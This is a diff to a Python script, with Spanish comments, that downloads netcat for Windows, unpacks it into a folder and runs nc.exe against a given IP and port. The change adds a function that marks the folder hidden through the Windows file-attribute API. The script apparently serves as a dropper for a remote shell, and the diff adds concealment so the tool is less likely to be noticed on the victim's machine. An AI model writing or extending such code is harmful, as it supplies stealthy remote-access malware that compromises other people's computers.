@@ -3,6 +3,7 @@ import requests
 import zipfile
 import subprocess
 import sys
+import ctypes
 
 def descargar_archivo(url, nombre_archivo):
     try:
@@ -32,6 +33,20 @@ def ejecutar_nc(ruta_nc, ip, puerto):
         print("Error al ejecutar nc.exe:", e)
         sys.exit(1)
 
+def crear_carpeta_oculta(ruta):
+    try:
+        if not os.path.exists(ruta):
+            os.makedirs(ruta)
+            FILE_ATTRIBUTE_HIDDEN = 0x02
+            ret = ctypes.windll.kernel32.SetFileAttributesW(ruta, FILE_ATTRIBUTE_HIDDEN)
+            if ret:
+                print(f'Carpeta {ruta} creada y ocultada correctamente.')
+            else:  # Si la función falla entonces ret será 0
+                print(f'No se pudo ocultar la carpeta {ruta}.')
+    except Exception as e:
+        print("Error al crear la carpeta oculta:", e)
+        sys.exit(1)
+
 def main():
     # URL del archivo a descargar
     url = "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip"
@@ -44,8 +59,7 @@ def main():
     descargar_archivo(url, nombre_archivo)
 
     # Crear carpeta oculta
-    if not os.path.exists(carpeta_oculta):
-        os.makedirs(carpeta_oculta)
+    crear_carpeta_oculta(carpeta_oculta)
 
     # Descomprimir el archivo
     descomprimir_archivo(nombre_archivo, carpeta_oculta)
